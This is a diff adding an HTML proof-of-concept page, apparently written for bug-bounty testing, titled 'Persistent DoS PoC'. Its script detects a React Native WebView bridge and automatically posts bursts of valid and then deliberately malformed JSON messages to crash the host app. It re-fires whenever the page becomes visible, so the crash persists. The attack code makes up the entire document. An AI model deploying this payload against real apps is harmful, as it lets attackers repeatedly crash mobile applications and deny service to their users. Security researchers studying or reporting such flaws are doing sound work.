@@ -1,0 +1,70 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Persistent DoS PoC – Auto</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>body{margin:0;background:#000;color:#bbb;font-family:system-ui,Segoe UI,Inter,Roboto,Arial,sans-serif}pre{white-space:pre-wrap;padding:12px}</style>
+</head>
+<body>
+<pre id="log">Initializing…</pre>
+<script>
+(function(){
+  const log = m => (document.getElementById('log').textContent += '\n' + m);
+
+  // Konfigurasi default (tak perlu query param)
+  const LONG_LEN   = 3000;   // panjang string valid
+  const BURSTS     = 5;      // berapa kali pengulangan valid→malformed
+  const INTERVALMS = 120;    // jeda antar burst (ms)
+  const VALID      = JSON.stringify({ type: "long", data: "a".repeat(LONG_LEN) });
+  const MALFORMED  = "{unclosed_json:"; // sengaja tidak valid
+
+  function hasIOS()     { return !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.ReactNativeWebView); }
+  function hasAndroid() { return !!(window.ReactNativeWebView && typeof window.ReactNativeWebView.postMessage === "function"); }
+
+  async function fireOnce() {
+    let sent = false;
+
+    try {
+      if (hasIOS()) {
+        // VALID → MALFORMED
+        window.webkit.messageHandlers.ReactNativeWebView.postMessage(VALID);
+        window.webkit.messageHandlers.ReactNativeWebView.postMessage(MALFORMED);
+        sent = true;
+      }
+      if (hasAndroid()) {
+        window.ReactNativeWebView.postMessage(VALID);
+        window.ReactNativeWebView.postMessage(MALFORMED);
+        sent = true;
+      }
+    } catch (e) {
+      log("JS Exception: " + (e && e.message || e));
+    }
+
+    if (!sent) log("ReactNativeWebView handler not available (bukan in-app WebView).");
+    return sent;
+  }
+
+  // Burst loop (tanpa interaksi user)
+  (async () => {
+    const env = { href: location.href, ua: navigator.userAgent, ts: new Date().toISOString() };
+    log("ENV: " + JSON.stringify(env));
+
+    // beri sedikit waktu agar webview siap
+    await new Promise(r => setTimeout(r, 200));
+
+    for (let i = 0; i < BURSTS; i++) {
+      await fireOnce();
+      if (i < BURSTS - 1) await new Promise(r => setTimeout(r, INTERVALMS));
+    }
+
+    // optional: kirim lagi saat halaman kembali terlihat (untuk efek “persisten”)
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'visible') fireOnce();
+    });
+    window.addEventListener('pageshow', fireOnce);
+  })();
+})();
+</script>
+</body>
+</html>
